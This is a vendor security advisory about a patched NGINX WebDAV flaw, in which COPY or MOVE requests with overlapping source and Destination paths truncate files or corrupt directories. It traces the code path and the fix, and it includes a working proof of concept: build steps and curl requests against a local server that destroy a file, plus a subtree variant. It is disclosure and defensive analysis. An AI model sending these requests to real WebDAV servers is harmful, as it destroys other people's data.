---
schema_version: "1.0.0"
document_id: "8b211ad66fc1e64ee986700bc946f1749b1cd060514702bff52d93cc3ef48aa2"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/nginx-dav-copy-move-path-overlap"
published_at: "2026-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:24:25.720028+00:00"
content_hash: "sha256:87eab375c172134e41079d48b05f044e909b4384c2a34ecbd3c2cbf4d4f41c44"
---

# WebDAV COPY/MOVE path overlap corrupts files and collections

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


High


2026


# WebDAV COPY/MOVE path overlap corrupts files and collections


## Summary


NGINX DAV accepted COPY and MOVE operations whose source and Destination resolved to the same path or overlapping collection paths


The NGINX HTTP DAV module's` ngx_http_dav_copy_move_handler()` parsed the client-controlled` Destination` header and mapped both the request URI and destination URI to filesystem paths, but it did not validate that the resolved paths were distinct and non-overlapping.


If a` COPY` request targeted the same file path as its source, execution reached` ngx_copy_file(path.data, copy.path.data, &cf)` .` ngx_copy_file()` opens the source first, then opens the destination with` NGX_FILE_TRUNCATE` ; when both names resolve to the same file, the destination open truncates the source and destroys the file contents. For collection operations, copying or moving a directory into its own subtree could make the recursive walk create nested copies under the source tree and corrupt or destroy the directory structure.


The upstream fix in commit` f0a0846` normalizes repeated slashes and rejects same-location or parent-child source/destination pairs with` 403 Forbidden` . The final merge was PR #1307; the earlier PR #1291 contains the detailed vulnerability explanation.


### CVSS Score


Vector


N


Complexity


L


Privileges


L


User Interaction


N


Scope


U


Confidentiality


N


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H


### Vulnerability Location


Source


Line 559


src /http


/modules


/ngx_http_dav_module.c


ngx_http_dav_copy_move_handler() (Destination header)


Sink


Line 864


src /http


/modules


/ngx_http_dav_module.c


ngx_copy_file() / 851:ngx_ext_rename_file() / 825:ngx_walk_tree()


## Source-to-Sink Analysis


1


src/http/modules/ngx_http_dav_module.c:559-636


The DAV COPY/MOVE handler takes the client-controlled` Destination` header, accepts either an absolute path or same-host absolute URI, and stores the parsed destination URI in` duri` .


CPP


```text
dest = r->headers_in.destination;


if   (dest ==  NULL  ) {
ngx_log_error  (NGX_LOG_ERR, r->connection->log,  0  ,
"client sent no \"Destination\" header"  );
return   NGX_HTTP_BAD_REQUEST;
}


p = dest->value.data;
/* there is always '\0' even after empty header value */
if   (p[ 0  ] ==  '/'  ) {
last = p + dest->value.len;
goto   destination_done;
}


/* ... same-host absolute URI validation ... */


destination_done:


duri.len = last - p;
duri.data = p;
flags = NGX_HTTP_LOG_UNSAFE;


if   ( ngx_http_parse_unsafe_uri  (r, &duri, &args, &flags) != NGX_OK) {
goto   invalid_destination;
}


```


2


src/http/modules/ngx_http_dav_module.c:706-734 (before fix)


The vulnerable handler maps both the request URI and` Destination` URI to filesystem paths, then proceeds without comparing whether` path` and` copy.path` are the same resource or a parent/child collection relationship.


CPP


```text
if   ( ngx_http_map_uri_to_path  (r, &path, &root,  0  ) ==  NULL  ) {
return   NGX_HTTP_INTERNAL_SERVER_ERROR;
}


uri = r->uri;
r->uri = duri;


if   ( ngx_http_map_uri_to_path  (r, &copy.path, &root,  0  ) ==  NULL  ) {
return   NGX_HTTP_INTERNAL_SERVER_ERROR;
}


r->uri = uri;


copy.path.len--;   /* omit "\0" */


if   (copy.path.data[copy.path.len -  1  ] ==  '/'  ) {
slash =  1  ;
copy.path.len--;
copy.path.data[copy.path.len] =  '\0'  ;


}  else   {
slash =  0  ;
}


ngx_log_debug1  (NGX_LOG_DEBUG_HTTP, r->connection->log,  0  ,
"http copy to: \"%s\""  , copy.path.data);


```


3


src/http/modules/ngx_http_dav_module.c:858-865 (before fix)


For file COPY, the already-resolved source and destination paths flow directly into` ngx_copy_file()` . A request such as` COPY /dav/file` with` Destination: /dav/file` reaches this sink.


CPP


```text
cf.size =  ngx_file_size  (&fi);
cf.buf_size =  0  ;
cf.access =  ngx_file_access  (&fi);
cf.time =  ngx_file_mtime  (&fi);
cf.log = r->connection->log;


if   ( ngx_copy_file  (path.data, copy.path.data, &cf) == NGX_OK) {
return   NGX_HTTP_NO_CONTENT;
}


```


4


src/core/ngx_file.c:811-848


` ngx_copy_file()` opens the source first and later opens the destination with` NGX_FILE_TRUNCATE` . If both path strings identify the same file, the destination open truncates the file while the source descriptor still points to it.


CPP


```text
fd =  ngx_open_file  (from, NGX_FILE_RDONLY, NGX_FILE_OPEN,  0  );


/* ... size and access are derived from the source ... */


nfd =  ngx_open_file  (to, NGX_FILE_WRONLY, NGX_FILE_TRUNCATE, access);


if   (nfd == NGX_INVALID_FILE) {
ngx_log_error  (NGX_LOG_CRIT, cf->log, ngx_errno,
ngx_open_file_n  " \"%s\" failed"  , to);
goto   failed;
}


```


5


src/http/modules/ngx_http_dav_module.c:806-829 (before fix)


For collection COPY/MOVE, a destination inside the source tree can be created before` ngx_walk_tree()` recursively copies the source. For MOVE, the source tree is then deleted after a successful walk, compounding the corruption/destruction risk.


CPP


```text
if   ( ngx_create_dir  (copy.path.data,  ngx_file_access  (&fi))
== NGX_FILE_ERROR)
{
return    ngx_http_dav_error  (r->connection->log, ngx_errno,
NGX_HTTP_NOT_FOUND,
ngx_create_dir_n, copy.path.data);
}


copy.len = path.len;


tree.file_handler = ngx_http_dav_copy_tree_file;
tree.pre_tree_handler = ngx_http_dav_copy_dir;
tree.post_tree_handler = ngx_http_dav_copy_dir_time;
tree.spec_handler = ngx_http_dav_noop;
tree.data = &copy;


if   ( ngx_walk_tree  (&tree, &path) == NGX_OK) {


if   (r->method == NGX_HTTP_MOVE) {
rc =  ngx_http_dav_delete_path  (r, &path,  1  );


```


6


src/http/modules/ngx_http_dav_module.c:725-745,885-940 (fix)


Commit` f0a0846` normalizes repeated slashes, then rejects same-path and parent-child collection operations before any filesystem mutation is attempted.


CPP


```text
ngx_http_dav_merge_slashes  (&path);
ngx_http_dav_merge_slashes  (&copy.path);


copy.path.len--;   /* omit "\0" */


/* ... strip destination collection slash ... */


if   ( ngx_http_dav_validate_paths  (r, &path, &copy.path, slash, dest)
!= NGX_OK)
{
return   NGX_HTTP_FORBIDDEN;
}


/* validation helper */
if   (len == dst->len &&  ngx_strncmp  (src->data, dst->data, len) ==  0  ) {
return   NGX_HTTP_FORBIDDEN;
}


if   (slash
&&  ngx_strncmp  (src->data, dst->data,  ngx_min  (len, dst->len)) ==  0
&& (len < dst->len
? dst->data[len] ==  '/'
: src->data[dst->len] ==  '/'  ))
{
return   NGX_HTTP_FORBIDDEN;
}


```


## Impact Analysis


### Critical Impact


A user with DAV write capability can destroy or corrupt resources inside the writable DAV repository. The issue does not bypass NGINX's host/root validation or grant filesystem access outside the configured DAV path, but within that repository it can cause high-impact integrity loss and availability degradation through file truncation or directory-tree corruption.


### Attack Surface


NGINX deployments built with` ngx_http_dav_module` and locations that enable` dav_methods COPY MOVE` for files or collections reachable by an attacker.


### Preconditions


The attacker must be able to issue DAV` COPY` or` MOVE` requests to the affected location. In authenticated WebDAV deployments this usually means a writable DAV account; if the DAV location is publicly writable, no application credentials are required.


## Proof of Concept


### Environment Setup


Build a vulnerable NGINX revision before commit` f0a0846` with the HTTP DAV module enabled:


BASH


```text
git  clone   https://github.com/nginx/nginx.git
cd   nginx
git checkout 3b5da468b3b14857fbd90298e249d6333dc68705
./auto/configure --prefix= " $PWD  /build"   \
--with-http_dav_module \
--without-http_rewrite_module --without-http_gzip_module
make -j " $(sysctl -n hw.ncpu 2>/dev/null || getconf _NPROCESSORS_ONLN)  "
make install
mkdir   -p  " $PWD  /build/html/dav"


```


### Target Configuration


Run NGINX with a writable DAV location:


NGINX


```text
worker_processes 1;
error_log logs/error.log debug;
pid logs/nginx.pid;


events { worker_connections 1024; }


http {
server {
listen 127.0.0.1:8080;
server_name localhost;


location /dav/ {
root html;
dav_methods PUT DELETE MKCOL COPY MOVE;
create_full_put_path on;
}
}
}


```


Save that as` build/conf/nginx.conf` and start with:


BASH


```text
./build/sbin/nginx -p  " $PWD  /build"   -c conf/nginx.conf


```


### Exploit Delivery


Create a non-empty DAV file and then copy it onto itself:


BASH


```text
printf    'important-data'   > /tmp/nginx-dav-body.txt
curl -i -X PUT --data-binary @/tmp/nginx-dav-body.txt \
http://127.0.0.1:8080/dav/file.txt


curl -i -X COPY \
-H  'Destination: /dav/file.txt'   \
http://127.0.0.1:8080/dav/file.txt


stat   -c  '%s bytes'   build/html/dav/file.txt 2>/dev/null \
||  stat   -f  '%z bytes'   build/html/dav/file.txt


```


A collection-overlap variant is` COPY /dav/tree/` with` Destination: /dav/tree/child/` , or the same operation with` MOVE` .


### Outcome


The same-path` COPY` demonstrates deterministic file destruction. The collection variant demonstrates why the patch also rejects parent-child path relationships: recursive operations against a subtree of the source can corrupt or remove the collection being copied or moved.


**Expected Response:** On a vulnerable build, the self-copy may return an error after the destructive open, but the file has already been truncated to` 0 bytes` . On a fixed build containing commit` f0a0846` , same-location and parent-child DAV operations are rejected with` 403 Forbidden` before filesystem mutation.


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/commit/f0a084645b8fede56ee08f2cc557c2475eb2a28d)
